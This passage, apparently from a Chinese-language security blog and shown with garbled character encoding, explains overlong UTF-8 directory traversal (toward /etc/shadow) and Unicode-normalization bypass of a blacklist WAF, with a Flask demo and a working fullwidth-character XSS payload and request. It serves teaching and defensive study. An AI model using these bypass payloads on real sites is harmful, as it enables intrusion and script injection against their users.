<li>åœ¨ è¡¨5 ä¸­æŸ¥æ‰¾å­—ç¬¦çš„ç ç‚¹æ‰€åœ¨çš„ç ç‚¹èŒƒå›´ï¼Œä»¥ç¡®å®šåº”ä½¿ç”¨å‡ ä¸ªå­—èŠ‚ç¼–ç è¯¥å­—ç¬¦</li>
<li>å°†å­—ç¬¦çš„ç ç‚¹è½¬æ¢ä¸ºäºŒè¿›åˆ¶</li>
<li>å°†è½¬æ¢åçš„äºŒè¿›åˆ¶æ•°å€¼ä»å³åˆ°å·¦(å³ä»æœ€åä¸€ä½ä½ä½å¼€å§‹)ä¾æ¬¡æŒ‰ç›¸åŒé¡ºåºå¡«å…… è¡¨5 ä¸­çš„ xï¼Œå¤šå‡ºçš„ x å¡«å…… 0ã€‚</li>
<li>ç¤ºä¾‹ï¼šâ€œæ±‰â€çš„Unicodeçš„ç ç‚¹æ˜¯ <code>U+6C49</code> (<code>1101100 01001001</code>) ï¼Œå…¶ç¼–ç è¿‡ç¨‹å¦‚ä¸‹ï¼š<ul>
<li><code>6C49</code> åœ¨ è¡¨5 çš„ç ç‚¹èŒƒå›´ä¸º <code>U+0800 ~ U+FFFF</code>ï¼Œæ‰€ä»¥åº”ä½¿ç”¨ 3 ä¸ªå­—èŠ‚ç¼–ç </li>
<li>å°† <code>6C49</code> çš„äºŒè¿›åˆ¶æ•° <code>110 1100 0100 1001</code> ä»æœ€åä¸€ä½å¼€å§‹ï¼ŒæŒ‰ä»å³å‘å·¦çš„é¡ºåºå¡«å…… è¡¨5 ä¸­çš„ xï¼Œæœ€ç»ˆå¾—åˆ° â€œæ±‰â€ å­—çš„ UTF-8 ç¼–ç ä¸º <code>1110 0110 1011 0001 1000 1001</code> (<code>0xE6 B189</code>)ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</li>
</ul>
</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/2020123118211124.png"></p>
<p><strong>å‰æçŸ¥è¯†ç‚¹ä¸‰ï¼š</strong></p>
<p>ASCII åªå®šä¹‰ å­—èŠ‚ 0-127 çš„ç¬¦å·ã€‚å¯¹äºç‰¹æ®Šç¬¦å·ï¼ˆä¾‹å¦‚ï¼Œå¯¹äºéè‹±è¯­å›½å®¶ï¼‰å¯¹ ASCII æœ€å¸¸è§çš„æ‰©å±•æ˜¯ Unicodeã€‚ Unicode å°† <code>/</code> ä¹‹ç±»çš„ç¬¦å·è½¬æ¢ä¸ºç”±æ•°å­—è¡¨ç¤ºçš„ç ç‚¹ï¼ˆcode pointï¼‰ï¼›ä¾‹å¦‚ï¼Œ<code>/</code> æ˜¯ç¬¬ 47 ä¸ªç ç‚¹ï¼ˆåå…­è¿›åˆ¶ <code>0x2f</code>ï¼‰ï¼Œ<code>Ï€</code> æ˜¯ç¬¬ 960 ä¸ªç ç‚¹ï¼ˆ<code>0x3c0</code>ï¼‰ï¼Œ<code>â™¥</code> æ˜¯ç¬¬ 9829 ä¸ªç ç‚¹ï¼ˆ<code>0x2665</code>ï¼‰ã€‚ç°åœ¨è¦å°† unicode ç¬¦å·æ”¾å…¥å­—èŠ‚æµä¸­ï¼Œå¿…é¡»å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œå¸¸è§çš„ç¼–ç æ˜¯ UTF-8ï¼Œå› ä¸º UTF-8 ç»§ç»­ä»¥å•ä¸ªå­—èŠ‚ï¼ˆ8 bitsï¼‰ç¼–ç  ASCII å­—ç¬¦ï¼Œæ‰€ä»¥å®ƒä¸ä¼šç ´ååŸå§‹ ASCII å­—ç¬¦é›†çš„ç¼–ç ã€‚æ³¨æ„ ASCII åªå®šä¹‰äº† 128 ä¸ªç¬¦å·ï¼Œå®ƒä»¬çš„ç¬¬ä¸€ä½éƒ½æ˜¯ 0ï¼ˆASCII ä¸­æœ‰æ•ˆæ¯”ç‰¹ä½ä¸º7ä½ï¼Œå€¼ä»‹äº 0-127 ä¹‹é—´ï¼Œå¦‚: <code>/</code> äºŒè¿›åˆ¶è¡¨ç¤ºä¸º <strong>0</strong>0101111ï¼‰ã€‚</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2015/05/2011050311372042.png"></p>
<p>UTF-8 åœ¨å¤„ç†å­—ç¬¦çš„æ—¶å€™ï¼Œå¦‚æœé‡åˆ°æ­£å¸¸çš„ ASCII å­—ç¬¦ä»ç„¶åƒå¾€å¸¸ä¸€æ ·ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¿›è¡Œç¼–ç ï¼Œè§£ç åº”ç”¨ç¨‹åºé€šè¿‡è¯†åˆ«è¯¥å­—èŠ‚çš„ç¬¬ä¸€ä½æ˜¯å¦ä¸º <code>0</code> æ¥åˆ¤æ–­è¯¥å­—ç¬¦æ˜¯å¦ä¸ºASCIIå­—ç¬¦ ã€‚å½“åˆ°è¾¾ä¸‹ä¸€ä¸ªè¦å¤„ç†çš„å­—èŠ‚æ—¶ï¼Œå¦‚æœè¯†åˆ«åˆ°ç¬¬ä¸€ä½å¼€å§‹ç”¨ <code>1</code> è¡¨ç¤ºï¼Œåˆ™ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ä½¿ç”¨å¤šå­—èŠ‚åºåˆ—ç¼–ç çš„å­—ç¬¦ã€‚å­—èŠ‚æ•°ç”±ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼å†³å®šï¼ˆå¤šå­—èŠ‚åºåˆ—ç¼–ç å­—ç¬¦ï¼Œé¦–å­—èŠ‚ <code>1</code> çš„ä¸ªæ•°ç”¨äºåˆ¤æ–­ç¼–ç åçš„å­—èŠ‚é•¿åº¦ï¼Œç„¶åç´§æ¥ç€ä»¥æ•°å­— <code>0</code> ä½œä¸ºç»ˆç»“æ ‡å¿—ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¤šå­—èŠ‚åºåˆ—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æ ¼å¼ä¸º <code>110x xxxx</code>ï¼Œåˆ™è¡¨ç¤ºä¸‹ä¸€ä¸ªç¬¦å·ç”¨åŒå­—èŠ‚è¡¨ç¤ºã€‚ç±»ä¼¼åœ°ï¼Œ<code>1110 xxxx</code> è¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªä¸‰å­—èŠ‚åºåˆ—çš„å¼€å§‹ï¼Œ<code>1111 0xxx</code> æ˜¯ä¸€ä¸ªå››å­—èŠ‚åºåˆ—ã€‚æ­£å¦‚ä¸Šé¢ï¼Œ<em><strong>å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8 ç¼–ç çŸ¥è¯†</strong></em> ä¸­çš„ <strong>è¡¨5</strong> æ‰€ç¤ºã€‚ä½ ä¼šæ³¨æ„åˆ°åŒå­—èŠ‚åºåˆ—åº”è¯¥åœ¨å½¢æˆ <code>110x xxxx 10xx xxxx</code> æ¥è¡¨ç¤ºå…·æœ‰äºŒè¿›åˆ¶æ•° <code>xxx xxxx xxxx</code> çš„ Unicode ä»£ç ç‚¹ï¼ŒåŸåˆ™ä¸Šå¯ä»¥æ˜¯ä» <code>000 0000 0000</code> (0) åˆ° <code>111 1111 1111</code> (2047) çš„ä»»ä½•äºŒè¿›åˆ¶æ•°ã€‚åœ¨ï¼ˆ<code>C0AF</code>ï¼‰ä¸­ï¼ŒäºŒè¿›åˆ¶å€¼ä¸º <code>1100 0000 1010 1111</code>ï¼Œå®ƒè¡¨ç¤ºä»£ç ç‚¹ <code>00000101111 = 47 = /</code>ã€‚è¯·æ³¨æ„ï¼Œ47 ä¹Ÿå¯ä»¥æ›´ç®€å•åœ°ç”¨ä¸€ä¸ª ASCII å­—ç¬¦ <code>/</code> æ¥è¡¨ç¤ºï¼Œå³ä½ <code>0010 1111</code>ã€‚è‡³äºä¸ºä»€ä¹ˆç¬¬äºŒä¸ªå­—èŠ‚å®šä¹‰ä¸ºä»¥ 10 å¼€å¤´,è¿™æ˜¯ç”±äºUTF-8ç¼–ç çš„ç®—æ³•åŸå› ï¼Œå…·ä½“è¯·ä»”ç»†çœ‹çœ‹ <em><strong>å‰æçŸ¥è¯†ç‚¹äºŒï¼šUTF-8 ç¼–ç çŸ¥è¯†</strong></em> ä¸­çš„ <strong>è¡¨5</strong> ä»¥åŠ <strong>ç¼–ç æ–¹æ³•</strong> ã€‚</p>
<p>æ‰€ä»¥ï¼ŒæŒ‰ç…§ä¸Šæ‰€è¿°ï¼Œè¿™å¥½åƒå…è®¸å¤šç§æ–¹å¼æ¥è¡¨ç¤ºæ¯ä¸ª Unicode å­—ç¬¦ï¼Œä½†è¿™åœ¨ Unicode æ ‡å‡†ä¸­æ˜¯ä¸å…è®¸çš„ã€‚åŒå­—èŠ‚åºåˆ—(<code>110x xxxx 10xx xxxx</code>)çš„å½¢å¼ï¼Œç ç‚¹èŒƒå›´åº”è¯¥åªå…è®¸åœ¨ 128 å’Œ 2047 ä¹‹é—´ï¼Œæ‰€ä»¥ <code>C0AF</code> ä¸åº”è¯¥è¡¨ç¤ºä¸º <code>/</code>ï¼Œ è¿™æ˜¯ä¸€ä¸ªé”™è¯¯ã€‚ä½†æ˜¯ï¼ŒUnicode åº“é€šå¸¸è¢«è¦æ±‚è®¾è®¡ä¸ºèƒ½å¤Ÿå¿«é€Ÿåœ°å°†å­—ç¬¦è§£æå‡ºæ¥ï¼Œäººä»¬å¯èƒ½ä¸ä¼šè€ƒè™‘å®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼ŒæŸäº›åº“å¯èƒ½é€‰æ‹©ä¸æ£€æŸ¥<strong>åŒåºåˆ— Unicode å­—ç¬¦</strong>çš„ç ç‚¹æ˜¯å¦åœ¨æœ‰æ•ˆèŒƒå›´å†…ï¼ˆå³ä½¿ Unicode æ ‡å‡†ç¦æ­¢è¿™æ ·åšï¼‰ã€‚æˆ–è€…å¼€å‘äººå‘˜è®¤ä¸ºï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ¥æ”¶åˆ°ä¸€ä¸ª <code>C0AF</code>ï¼Œå¾ˆå¯èƒ½æ˜¯ä¸€äº›å…·æœ‰æ ¼å¼é”™è¯¯çš„ UTF-8 åº”ç”¨ç¨‹åºæƒ³è¦å‘é€ <code>2F</code> ï¼Œä½†å› ä¸ºå¤„ç†é”™è¯¯è€Œå¯¼è‡´å‘é€äº†<code>C0AF</code>ã€‚å› æ­¤å†³å®šå°† <code>C0AF</code> è§£æä¸º <code>2F</code> æ˜¯æ–¹ä¾¿ç”¨æˆ·çš„å‹å¥½åŠæ˜æ™ºçš„è¡Œä¸ºã€‚</p>
<p>åŒæ ·ï¼Œ <code>%C0%2F</code> ä¹Ÿé€‚ç”¨äºä¸€äº›å¤§ç¬¨è›‹ Unicode åº“ï¼Œå› ä¸ºè®¸å¤šè§£ç  Unicode çš„åº”ç”¨ç¨‹åºä¸ä¼šæ£€æŸ¥ç¬¬äºŒä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½æ˜¯å¦ä¸º <code>1</code>ï¼Œå› ä¸ºå‰ä¸€ä¸ªå­—èŠ‚å·²ç»è¡¨æ˜å®ƒæ˜¯ä¸€ä¸ªåŒå­—èŠ‚ç¼–ç çš„å­—ç¬¦ã€‚é‚£å°±æ˜¯é”™è¯¯çš„è§£ç å™¨æ¥å— <code>110x xxxx ??xx xxxx</code> ä½œä¸ºæœ‰æ•ˆçš„åŒå­—èŠ‚ç¼–ç çš„å­—ç¬¦ï¼Œè€Œä¸ç®¡ <code>??</code> æ˜¯ <code>10</code> æ˜¯ä½œä¸º UTF8 è§£æåŒåºåˆ—å­—ç¬¦çš„æ ‡å‡†è¦æ±‚ã€‚ç¬¬äºŒä¸ªå­—èŠ‚çš„å‰ä¸¤ä¸ªå­—ç¬¦å¹¶ä¸å®é™…å½±å“UTF-8è§£ç ç»“æœï¼Œæˆ‘ä»¬å¯è®¤ä¸ºå®ƒä»¬æ˜¯å¤šä½™çš„ï¼Œå› æ­¤å­˜åœ¨é—®é¢˜çš„ Unicode è§£ç åº”ç”¨ç¨‹åºå¯èƒ½å†³å®šä¸æ£€æŸ¥è¿™äº›å­—ç¬¦æ˜¯å¦åŒ¹é…æ­£ç¡®çš„å€¼ã€‚</p>
<p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬çŸ¥é“ä¸ºä»€ä¹ˆ <code>%C0%AF</code> å’Œ <code>%C0%2F</code> æœ€ç»ˆéƒ½ä½¿ç”¨è·³è¿‡æ­£ç¡®æ£€æŸ¥çš„ Unicode è§£ç å™¨è§£ç ä¸ºç¬¦å· <code>/</code> ã€‚</p>
<p>è‡³äºä¸ºä»€ä¹ˆè¿™ä¼šæˆåŠŸåœ°å…è®¸ç›®å½•éå†ï¼Œç»å¸¸ä¼šå‘ç”Ÿè¿‡æ»¤ä¸æ­£ç¡®çš„è¾“å…¥å’Œè§£ç  Unicode ç¬¦å·æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„ä¸åŒé˜¶æ®µå®Œæˆçš„ã€‚ Web æœåŠ¡å™¨å¯èƒ½è¶³å¤Ÿå®‰å…¨ï¼Œä¸å…è®¸æŸäººé€šè¿‡ <code>http://www.example.com/../../../etc/shadow</code> ç”šè‡³ <code>http://www.example.com /..%2f..%2f..%2fetc%2fshadow</code>çš„å½¢å¼è¿›è¡Œæ”»å‡»ã€‚ä½†æ˜¯ï¼Œå¦‚æœ Web æœåŠ¡å™¨æ­£åœ¨æä¾›æ–‡ä»¶å¹¶ä¸”è§£ç  unicode æ˜¯åœ¨é˜²æ­¢ç›®å½•éå†çš„æ£€æŸ¥ä¹‹åå®Œæˆçš„ï¼Œæˆ–è€…ç”±æ“ä½œç³»ç»Ÿå®Œæˆçš„ç¨æœ‰ä¸åŒï¼Œåˆ™æ­¤æ”»å‡»å¯èƒ½ä¼šé€šè¿‡è¿‡æ»¤å™¨ï¼Œä»è€Œå…è®¸æ”»å‡»èµ·ä½œç”¨ã€‚</p>
<h2 id="0x02-unicode-è§„èŒƒåŒ–æ¼æ´"><a href="#0x02-unicode-è§„èŒƒåŒ–æ¼æ´" class="headerlink" title="0x02- unicode è§„èŒƒåŒ–æ¼æ´"></a>0x02- unicode è§„èŒƒåŒ–æ¼æ´</h2><p>Unicode å…¼å®¹æ˜¯ Unicode ç­‰æ•ˆçš„ä¸€ç§å½¢å¼ï¼Œå®ƒç¡®ä¿åœ¨å¯èƒ½å…·æœ‰ä¸åŒè§†è§‰å¤–è§‚æˆ–è¡Œä¸ºçš„å­—ç¬¦æˆ–å­—ç¬¦åºåˆ—ä¹‹é—´ï¼Œè¡¨ç¤ºç›¸åŒçš„æŠ½è±¡å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>ğ•ƒ</code> å½’ä¸€åŒ–ä¸º <code>L</code>ã€‚è¿™ç§è¡Œä¸ºå¯èƒ½ä¸ºæ»¥ç”¨ä¸€äº›åœ¨è¾“å…¥è¢«å‡€åŒ–åæ‰§è¡Œ unicode å…¼å®¹æ€§çš„å¼±å®ç°æ‰“å¼€äº†å¤§é—¨ã€‚</p>
<h3 id="Unicode-å…¼å®¹æ€§è¡¨æ ¼"><a href="#Unicode-å…¼å®¹æ€§è¡¨æ ¼" class="headerlink" title="Unicode å…¼å®¹æ€§è¡¨æ ¼"></a>Unicode å…¼å®¹æ€§è¡¨æ ¼</h3><p>æœ‰å››ç§æ ‡å‡†çš„å½’ä¸€åŒ–å½¢å¼ï¼š</p>
<ul>
<li><strong>NFCï¼š</strong> è§„èŒƒåŒ–å½¢å¼è§„èŒƒç»„åˆ</li>
<li><strong>NFDï¼š</strong> è§„èŒƒåŒ–å½¢å¼çš„è§„èŒƒåˆ†è§£</li>
<li><strong>NFKCï¼š</strong> è§„èŒƒåŒ–å½¢å¼å…¼å®¹æ€§ç»„åˆ</li>
<li><strong>NFKDï¼š</strong> è§„èŒƒåŒ–å½¢å¼å…¼å®¹æ€§åˆ†è§£</li>
</ul>
<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/1.jpg"></p>
<p><code>NFKC</code> å’Œ <code>NKFD</code> æ˜¯æœ‰è¶£çš„ï¼Œå› ä¸ºè¿›è¡Œå…¼å®¹æ€§å¤„ç†ï¼Œè¦äº†è§£è¿™ç§è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ª Python ç‰‡æ®µï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">string = <span class="string">&quot;ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒ&quot;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFD&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, string))</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NFC: ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒ</span><br><span class="line">NFD: ğ•ƒâ…‡ğ™¤ğ“ƒâ…ˆğ”°ğ”¥ğ™–ğ“ƒ</span><br><span class="line">NFKC: Leonishan</span><br><span class="line">NFKD: Leonishan</span><br></pre></td></tr></table></figure>

<h3 id="æ¦‚å¿µè¯æ˜"><a href="#æ¦‚å¿µè¯æ˜" class="headerlink" title="æ¦‚å¿µè¯æ˜"></a>æ¦‚å¿µè¯æ˜</h3><p>ä¸ºäº†æ¼”ç¤ºè¿™ç§è¡Œä¸ºï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„ Web åº”ç”¨ç¨‹åºï¼Œå¦‚æœ WAF æ²¡æœ‰æ£€æµ‹åˆ°æŸäº›å¥‡æ€ªçš„å­—ç¬¦ï¼Œå®ƒä¼šå›æ˜¾ GET å‚æ•°å€¼ï¼š</p>
<ul>
<li><strong>server.py</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, request</span><br><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Welcome_name</span>():</span><br><span class="line">  name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> waf(name):</span><br><span class="line">    abort(<span class="number">403</span>, description=<span class="string">&quot;XSS Detected&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name) <span class="comment">#NFC, NFKC, NFD, and NFKD</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Test XSS: &#x27;</span> + name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(port=<span class="number">81</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>å¦‚æœæ£€æµ‹åˆ°é»‘åå•çš„å­—ç¬¦ï¼Œåº”ç”¨ç¨‹åºç›´æ¥ä¸­æ–­è®¿é—®ï¼š</p>
<ul>
<li><strong>waf.py</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">    blacklist = [<span class="string">&quot;~&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;#&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;^&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;\&quot;,&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;&quot;,&quot;&quot;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line">    vuln_detected = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(string <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">for</span> string <span class="keyword">in</span> blacklist): </span><br><span class="line">        vuln_detected = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> vuln_detected   </span><br></pre></td></tr></table></figure></li>
</ul>
<p>å› æ­¤ï¼Œå…·æœ‰ä»¥ä¸‹æœ‰æ•ˆè´Ÿè½½ (<code> &lt;img src=p onerror=&#39;prompt(1)&#39;&gt;</code>) çš„è¯·æ±‚å°†è¢«ä¸­æ­¢ï¼š</p>
<ul>
<li><p><strong>Requestï¼š</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?name=%3Cimg%20src=p%20onerror=%27prompt(1)%27%3E</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Response:</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">403</span> FORBIDDEN</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/0.16.0 Python/3.8.1</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 19 Feb 2020 11:11:58 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>XSS Detected<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>å®¡è®¡ä»¥ä¸‹ä»£ç è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œåœ¨ WAF åˆ†æè¾“å…¥åï¼ŒæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œä¸€äº› unicode è§„èŒƒåŒ–ã€‚å› æ­¤ï¼Œä¸æ™®é€š XSS æœ‰æ•ˆè´Ÿè½½ç›¸æ¯”ï¼Œæ ‡å‡†åŒ–åå…·æœ‰ç›¸åŒ unicode å€¼çš„æœ‰æ•ˆè´Ÿè½½å°†è§¦å‘ç›¸åŒçš„ç»“æœï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Request:</strong></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?name=%EF%BC%9Cimg%20src%E2%81%BCp%20onerror%E2%81%BC%EF%BC%87prompt%E2%81%BD1%E2%81%BE%EF%BC%87%EF%B9%A5</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Response:</strong></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>41</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: &lt;img src=p onerror=&#x27;prompt(1)&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/2.png"></p>
<p>å®Œç¾ï¼Œä½†æ˜¯å¦‚ä½•æ‰¾åˆ°è¿™äº›å­—ç¬¦ï¼Ÿè¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡å…¶ä»–æ¼æ´çš„ä¸€äº›é™åˆ¶å—ï¼Ÿ</p>
<h3 id="å¦‚ä½•æ‰¾åˆ°è§„èŒƒåŒ–çš„å­—ç¬¦ï¼Ÿ"><a href="#å¦‚ä½•æ‰¾åˆ°è§„èŒƒåŒ–çš„å­—ç¬¦ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°è§„èŒƒåŒ–çš„å­—ç¬¦ï¼Ÿ"></a>å¦‚ä½•æ‰¾åˆ°è§„èŒƒåŒ–çš„å­—ç¬¦ï¼Ÿ</h3><p>ä¸ºäº†åœ¨ unicode å…¼å®¹åæ‰¾åˆ°å…·æœ‰ç›¸åŒå«ä¹‰çš„å­—ç¬¦çš„å®Œæ•´åˆ—è¡¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç½‘ç«™ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></li>
</ul>
<p>å¯ä»¥æœç´¢ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰¾åˆ°å…¼å®¹åçš„ç›¸åŒå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ<code>&lt;</code>- <a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+003C">https://www.compart.com/en/unicode/U+003C</a></p>
<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/3.png"></p>
<p>æ˜¾ç¤ºè¿™ä¸‰ä¸ªå­—ç¬¦ <code>â‰® </code>ï¼Œ<code>ï¹¤</code> å’Œ <code>ï¼œ</code>ã€‚å•å‡»æ¯ä¸ªåï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åˆ†è§£éƒ¨åˆ†çœ‹åˆ°ä»¥ä»¥ä¸‹æ–¹å¼æ ‡å‡†åŒ–ï¼š</p>
<ul>
<li><code>â‰® </code>- &lt;(U+003C) -â€… <code>â—ŒÌ¸ </code>(U+0338)</li>
<li><code>ï¹¤</code>- &lt;(U+003C)</li>
<li><code>ï¼œ</code>- &lt;(U+003C)</li>
</ul>
